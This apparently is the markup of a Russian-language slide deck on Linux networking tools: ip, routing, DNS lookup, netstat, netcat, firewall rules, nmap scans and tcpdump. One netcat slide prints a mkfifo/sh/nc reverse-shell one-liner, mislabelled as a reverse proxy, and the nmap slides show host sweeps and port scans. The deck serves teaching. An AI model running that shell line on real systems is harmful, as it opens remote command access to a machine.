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320428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https://habr.com/ru/post/320428/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ip6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типы dns записей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0bd1b27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0bd1b27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cd17e3f6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cd17e3f6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b89b3377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b89b3377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b89b33774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b89b33774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b89b33774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b89b33774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b89b33774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b89b33774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a5d658e7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ca5d658e7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6099177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6099177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ca5d658e7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ca5d658e7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a5d658e7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ca5d658e7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91dc7875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91dc7875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a5d658e7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ca5d658e7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8b7630b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b8b7630b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80bd1b27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80bd1b27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ca5d658e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ca5d658e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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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ca5d658e7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https://2hpc.ru/%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D1%8C-osi-%D1%83%D1%80%D0%BE%D0%B2%D0%BD%D0%B8-%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB%D1%8B-%D1%84%D1%83%D0%BD%D0%BA%D1%86%D0%B8%D0%B8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nmap.org/man/ru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habr.com/ru/companies/first/articles/335428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hyperlink" Target="https://habr.com/ru/companies/vdsina/articles/562110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izardzin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Сеть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Это база!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6475" y="438750"/>
            <a:ext cx="6718677" cy="433545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311700" y="4774200"/>
            <a:ext cx="542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Сетевая модель OSI: уровни, протоколы и функции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311700" y="2082600"/>
            <a:ext cx="8520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ip --help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Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }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ip [ -force ] -batch filename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where  OBJECT := { link | address | addrlabel | route | rule | neigh | ntable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tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm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netns | l2tp | fou | macsec | tcp_metrics | token | netconf | ila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vrf | sr | nexthop }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OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve]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-h[uman-readable] | -iec | -j[son] | -p[retty]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-f[amily] { inet | inet6 | mpls | bridge | link }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-4 | -6 | -I | -D | -M | -B | -0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-l[oops] { maximum-addr-flush-attempts } | -br[ief]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-o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename]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-rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll]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-c[olor]}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3246" y="0"/>
            <a:ext cx="3550754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Примеры использования (ip a)</a:t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311700" y="572700"/>
            <a:ext cx="85206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Назначение IP-адреса интерфейсу eth0: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ip a add 192.168.1.200/24 dev eth0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Включить сетевой интерфейс eth0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ip link set eth0 up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Настроить сетевой интерфейс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ip link set eth0 mtu 9000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Сменить MAC-адрес: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ip link set dev eth0 address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BC:AE:C5:BE:8B:B7</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Google Shape;76;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="3758950"/>
            <a:ext cx="8520600" cy="1231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2: wlp59s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000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   link/ether 9c:b6:d0:c2:c4:1d brd ff:ff:ff:ff:ff:ff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   inet 192.168.1.39/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp59s0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Маршрутизация (route)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311700" y="572700"/>
            <a:ext cx="8832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root@TyVik-XPS:~# ip route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default via 192.168.1.1 dev wlp59s0 dhcp src 192.168.1.39 metric 600 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172.17.0.0/16 dev docker0 kernel scope link src 172.17.0.1 linkdown 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192.168.1.0/24 dev wlp59s0 kernel scope link src 192.168.1.39 metric 600 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311700" y="2123400"/>
            <a:ext cx="852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Добавление маршрута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дефолтного: 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ip route add default via 192.168.1.1 dev eth0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через шлюз: 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ip route add 192.168.0.0/16 via 10.0.0.1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до отдельного хоста: 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ip route add 192.168.0.1 via 172.16.0.1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Удаление маршрута: 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ip route del 192.168.0.0/16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/etc/resolv.conf</a:t>
            </a:r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311700" y="572700"/>
            <a:ext cx="8520600" cy="1015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cat /etc/resolv.conf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 resolv.conf autogenerated by /opt/ivpn/etc/client.up (tun0)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nameserver 10.34.44.1</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Google Shape;90;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1869225"/>
            <a:ext cx="8520600" cy="1323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resolvectl:</a:t>
            </a:r>
            <a:endParaRPr b="1"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query &lt;domain&gt; – узнать IP адрес домена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status – конфигурация DNS для интерфейсов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show-cache – просмотр кэша</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Google Shape;91;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="3473550"/>
            <a:ext cx="4358700" cy="15699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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>nslookup tyvik.ru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cat /etc/hosts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127.0.0.1	localhost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127.0.0.1	ya.ru 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</a:t>
            </a:r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244175" y="572700"/>
            <a:ext cx="85206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90000"/>
                </a:solidFill>
              </a:rPr>
              <a:t># dig geopuzzle.org @8.8.8.8 A</a:t>
            </a:r>
            <a:endParaRPr sz="1600"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; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; geopuzzle.org @8.8.8.8 A</a:t>
            </a:r>
            <a:endParaRPr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;; global options: +cmd</a:t>
            </a:r>
            <a:endParaRPr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;; Got answer:</a:t>
            </a:r>
            <a:endParaRPr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;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38487</a:t>
            </a:r>
            <a:endParaRPr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;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</a:t>
            </a:r>
            <a:endParaRPr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;; QUESTION SECTION:</a:t>
            </a:r>
            <a:endParaRPr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;geopuzzle.org.			IN	A</a:t>
            </a:r>
            <a:endParaRPr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5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; ANSWER SECTION:</a:t>
            </a:r>
            <a:endParaRPr sz="1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5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>geopuzzle.org.		2568	IN	A	67.207.79.140</a:t>
            </a:r>
            <a:endParaRPr sz="1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41B47"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; Query time: 48 msec</a:t>
            </a:r>
            <a:endParaRPr sz="16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41B47"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; SERVER: 8.8.8.8#53(8.8.8.8)</a:t>
            </a:r>
            <a:endParaRPr sz="16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41B47"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; WHEN: Thu Mar 25 21:07:54 MSK 2021</a:t>
            </a:r>
            <a:endParaRPr sz="16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41B47"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;; MSG SIZE  rcvd: 58</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="741B4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whois</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Google Shape;103;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="244175" y="572700"/>
            <a:ext cx="8520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$ whois ya.ru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domain:        YA.RU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nserver:       ns1.yandex.ru.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nserver:       ns2.yandex.ru.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state:         REGISTERED, DELEGATED, VERIFIED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org:           YANDEX, LLC.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registrar:     RU-CENTER-RU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admin-contact: https://www.nic.ru/whois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created:       1999-07-12T14:40:22Z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paid-till:     2021-07-31T21:00:00Z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free-date:     2021-09-01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source:        TCI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Last updated on 2021-03-28T14:31:30Z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DNS-записи</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="109" name="Google Shape;109;p21" title="Screenshot from 2025-05-16 21-51-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851" y="691575"/>
            <a:ext cx="7312294" cy="445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telnet</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Google Shape;115;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="572700"/>
            <a:ext cx="8520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$ telnet ya.ru 80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Trying 87.250.250.242...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Connected to ya.ru.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Escape character is '^]'.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GET / HTTP/1.1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Host: ya.ru</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Google Shape;116;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="2724150"/>
            <a:ext cx="8520600" cy="2154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^]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telnet&gt; help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Commands may be abbreviated.  Commands are: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close   	close current connection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logout  	forcibly logout remote user and close the connection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display 	display operating parameters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...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netstat</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Google Shape;122;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="852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# netstat -tlpn | grep LISTEN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tcp 0 0 localhost:6379  0.0.0.0:* LISTEN 1685/redis-server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tcp 0 0 localhost:53    0.0.0.0:* LISTEN 1205/systemd-resolv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tcp 0 0 localhost:631   0.0.0.0:* LISTEN 1324/cupsd         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tcp 0 0 localhost:41655 0.0.0.0:* LISTEN 1512/containerd    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tcp 0 0 localhost:5432  0.0.0.0:* LISTEN 1723/postgres      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311700" y="2571750"/>
            <a:ext cx="8658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netstat -atp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Active Internet connections (servers and established)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Proto Local Address    Foreign Address         State       PID/Program name  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localhost:6379   0.0.0.0:*               LISTEN      1685/redis-server 1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localhost:5432   0.0.0.0:*               LISTEN      1723/postgres     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TyVik-XPS:42952  149.154.167.51:https    ESTABLISHED 22797/Telegram    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TyVik-XPS:45920  172.65.251.78:https     ESTABLISHED 1493/gitlab-runner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TyVik-XPS:46178  lg-in-f139.1e100.:https ESTABLISHED 9207/chrome --type=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TyVik-XPS:35152  ec2-3-122-154-62.:https ESTABLISHED 56742/slack --type=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TyVik-XPS:43906  149.154.167.51:https    ESTABLISHED 22797/Telegram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netcat</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="129" name="Google Shape;129;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="255425" y="572700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Открывает соединение на порт 4444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nc -lvp 4444</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179225" y="3087300"/>
            <a:ext cx="852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Архивирование и отправка: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 tar -czf - /path/to/ | pv -b | nc -l 4444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 Получение архива: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nc servername 4444 | pv -b &gt; file.tar.gz</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Google Shape;131;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="235500" y="1745875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Реверс-прокси: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$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 0.0.0.0 8080 &gt;/tmp/f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Настройки ядра</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="877500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echo "1" &gt; /proc/sys/net/ipv4/ip_forward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sysctl net.ipv4.ip_forward=1</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2570925"/>
            <a:ext cx="85206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kernel.hostname – задать имя хоста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net.ipv4.icmp_echo_ignore_all – запретить ответ на ping (защита от DDoS)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net.ipv4.ip_default_ttl – время жизни пакета по умолчанию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net.ipv4.ip_forward – разрешить транзитные пакеты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net.ipv4.tcp_keepalive_time – время жизни соединения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net.core.rmem_max – максимальный размер буфера для чтения по сети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Фаервол (ufw, iptables)</a:t>
            </a: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311700" y="572700"/>
            <a:ext cx="8520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Значения по умолчанию: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# ufw default deny incoming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ufw default allow outgoing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Добавление правил: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ufw allow 22 80 443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ufw allow from 192.168.1.2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ufw allow from 192.168.1.0/24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ufw allow from 192.168.1.2 to any port 22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ufw allow in on eth0 to any port 80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Удаление правил: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ufw status numbered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ufw delete 2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328950" y="4259650"/>
            <a:ext cx="8486100" cy="615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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> iptables -A OUTPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT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iptables -A INPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT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nmap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4774200"/>
            <a:ext cx="5709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Справочное руководство Nmap (Man Page)</a:t>
            </a:r>
            <a:endParaRPr sz="1200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="8520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nmap -sn 192.168.1.0/24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Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-21 19:55 MSK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Nmap scan report for _gateway (192.168.1.1)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MAC Address: 58:8B:F3:65:CF:08 (Zyxel Communications)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Nmap scan report for 192.168.1.34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MAC Address: 50:EC:50:1F:B5:29 (Beijing Xiaomi Mobile Software)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311700" y="2242350"/>
            <a:ext cx="8520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nmap -p- 192.168.1.51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Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-21 20:02 MSK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Nmap scan report for 192.168.1.51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Host is up (0.051s latency).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Not shown: 65532 closed tcp ports (reset)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PORT     STATE SERVICE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1961/tcp open  bts-appserver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5081/tcp open  sdl-ets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7447/tcp open  unknown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MAC Address: B8:87:6E:8E:93:BA (Yandex Services AG)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tcpdump</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="572700"/>
            <a:ext cx="8832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# tcpdump -n -i any port 53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B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>21:27:10.869311</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1.34746</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.53.53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35935+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> [1au] A? tyvik.ru. (49)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B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>21:27:10.869696</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.1.47.47953</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.1.1.53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>43715+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> A? tyvik.ru. (26)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B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>21:27:10.913465</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.1.1.53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>192.168.1.47.47953</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>43715</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> 2/0/0 A 104.21.14.168 (58)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21:27:10.913790</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.53.53</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="0B5394"/>
                </a:solidFill>
              </a:rPr>
              <a:t>127.0.0.1.34746</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="990000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>35935</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600"/>
              <a:t> 2/0/1 A 104.21.14.168 (69)</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2341025"/>
            <a:ext cx="4978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Записать дамп в файл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tcpdump -i any -w packets.pcap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Посмотреть что приходит на 8000 порту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tcpdump -A dst port 8000</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="4774200"/>
            <a:ext cx="60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Давайте изучим tcpdump с Джулией Эванс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wireshark</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="167" name="Google Shape;1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449" y="572700"/>
            <a:ext cx="7649226" cy="423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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="4774200"/>
            <a:ext cx="526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Wireshark для всех. Лайфхаки на каждый день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w3m</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="174" name="Google Shape;1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738" y="572700"/>
            <a:ext cx="7658525" cy="42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Диагностика</a:t>
            </a:r>
            <a:endParaRPr/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572700"/>
            <a:ext cx="85206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Сетевой интерфейс поднят (ip, ifconfig)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Маршрут для сети существует (route)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DNS запросы расшифровываются (resolvectl, dig)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Порты открываются (netstat, nc)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Сервер доступен (ping, traceroute, telnet)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Фаервол настроен (ufw)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Сетевые пакеты не бьются (tcpdump)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Полезная нагрузка прилетает в правильном виде (wireshark)</a:t>
            </a:r>
            <a:endParaRPr sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Google Shape;181;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="4774200"/>
            <a:ext cx="358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https://wizardzines.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200"/>
              <a:t> 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